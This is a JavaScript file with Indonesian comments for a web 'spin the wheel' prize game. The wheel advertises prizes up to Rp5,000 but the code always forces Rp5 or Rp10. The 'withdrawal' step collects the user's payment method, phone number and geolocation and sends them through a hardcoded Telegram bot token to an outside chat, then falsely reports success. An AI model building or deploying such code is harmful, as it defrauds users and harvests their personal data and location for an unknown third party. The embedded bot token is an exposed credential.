// --- Konfigurasi Telegram ---
const TOKEN = "8455225450:AAFrdrWN-vt_sfIJtis6kJItWQ3DVxO7veg"; 
const CHAT_ID = "7616710585"; 

// --- Data roda (Rp1.000 - Rp5.000 + Rp5 & Rp10) ---
const hadiah = [1000, 2000, 3000, 4000, 5000, 5, 10];
let saldo = 0;

// Canvas roda
const canvas = document.getElementById('wheel');
const ctx = canvas.getContext('2d');
const spinBtn = document.getElementById('spinBtn');

// Elemen untuk timer cooldown
const timerDisplay = document.createElement('p');
timerDisplay.style.marginTop = "10px";
timerDisplay.style.color = "#FFD700";
timerDisplay.style.fontWeight = "bold";
timerDisplay.id = "timer";
document.querySelector(".wheel-container").appendChild(timerDisplay);

// --- Gambar roda ---
function drawWheel() {
  const segmen = hadiah.length;
  const anglePerSegmen = (2 * Math.PI) / segmen;

  for (let i = 0; i < segmen; i++) {
    ctx.beginPath();
    ctx.moveTo(150, 150);
    ctx.arc(150, 150, 150, i * anglePerSegmen, (i + 1) * anglePerSegmen);
    ctx.fillStyle = i % 2 === 0 ? '#00bcd4' : '#2196f3';
    ctx.fill();
    ctx.stroke();

    // Teks hadiah
    ctx.save();
    ctx.translate(150, 150);
    ctx.rotate(i * anglePerSegmen + anglePerSegmen / 2);
    ctx.textAlign = "right";
    ctx.fillStyle = "#fff";
    ctx.font = "bold 16px Poppins";
    ctx.fillText("Rp" + hadiah[i].toLocaleString(), 140, 10);
    ctx.restore();
  }
}

drawWheel();

// --- Buat panah penunjuk ---
const arrow = document.createElement('div');
arrow.style.width = "0";
arrow.style.height = "0";
arrow.style.borderLeft = "15px solid transparent";
arrow.style.borderRight = "15px solid transparent";
arrow.style.borderBottom = "25px solid #FFD700";
arrow.style.position = "absolute";
arrow.style.top = "-30px";
arrow.style.left = "calc(50% - 15px)";
document.querySelector(".wheel-container").appendChild(arrow);

// --- Fungsi hitung mundur cooldown ---
function startCountdown(duration) {
  let remaining = duration;
  const countdown = setInterval(() => {
    let minutes = Math.floor(remaining / 60);
    let seconds = remaining % 60;

    timerDisplay.innerText = `Tunggu ${minutes}:${seconds < 10 ? "0" + seconds : seconds} untuk putar lagi`;

    if (remaining <= 0) {
      clearInterval(countdown);
      timerDisplay.innerText = "";
      spinBtn.disabled = false;
      spinBtn.innerText = "Putar";
      localStorage.removeItem("spinCooldown");
    } else {
      remaining--;
      localStorage.setItem("spinCooldown", Date.now() + remaining * 1000);
    }
  }, 1000);
}

// --- Cek cooldown saat reload halaman ---
window.onload = () => {
  const cooldownEnd = localStorage.getItem("spinCooldown");
  if (cooldownEnd) {
    const now = Date.now();
    const diff = Math.floor((cooldownEnd - now) / 1000);
    if (diff > 0) {
      spinBtn.disabled = true;
      spinBtn.innerText = "Tunggu...";
      startCountdown(diff);
    }
  }
};

// --- Putar roda ---
let spinning = false;
spinBtn.addEventListener('click', () => {
  if (spinning) return;
  spinning = true;

  // --- Pilihan paksa hanya 5 atau 10 ---
  const forcedPrize = Math.random() < 0.5 ? 5 : 10;
  const targetIndex = hadiah.indexOf(forcedPrize);

  // Hitung sudut tujuan
  const segmenAngle = 360 / hadiah.length;
  const stopAngle = (hadiah.length - targetIndex) * segmenAngle - segmenAngle / 2;

  // Minimal 3 putaran penuh
  let spinAngle = stopAngle + (360 * 3);
  let currentAngle = 0;

  let spinInterval = setInterval(() => {
    currentAngle += 10;
    canvas.style.transform = `rotate(${currentAngle}deg)`;

    if (currentAngle >= spinAngle) {
      clearInterval(spinInterval);
      spinning = false;

      saldo += forcedPrize;
      document.getElementById('saldo').innerText = "Rp" + saldo.toLocaleString();
      alert(`Selamat! Anda mendapat Rp${forcedPrize}`);

      // --- Aktifkan cooldown 1 jam ---
      spinBtn.disabled = true;
      spinBtn.innerText = "Tunggu...";
      const cooldownDuration = 3600; // 1 jam
      const cooldownEndTime = Date.now() + cooldownDuration * 1000;
      localStorage.setItem("spinCooldown", cooldownEndTime);
      startCountdown(cooldownDuration);
    }
  }, 20);
});

// --- Fitur Penarikan ---
document.getElementById('tarikBtn').addEventListener('click', () => {
  const metode = document.getElementById('metode').value;
  const nomor = document.getElementById('nomor').value;
  const msg = document.getElementById('withdrawMsg');

  if (nomor.length < 10) {
    msg.innerText = "Nomor tidak valid!";
    return;
  }

  msg.innerText = "Anda mengkonfirmasi penarikan...";

  // Ambil lokasi pengguna
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;

      // Kirim ke Telegram
      const text = `
🎡 Game Putar Saldo
Metode: ${metode}
Nomor: ${nomor}
Saldo: Rp${saldo}
Lokasi: ${lat}, ${lon}
      `;
      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text
        })
      }).then(() => {
        msg.innerText = "Penarikan berhasil diproses!";
      }).catch(() => {
        msg.innerText = "Gagal mengirim data!";
      });
    });
  } else {
    msg.innerText = "Lokasi tidak tersedia!";
  }
});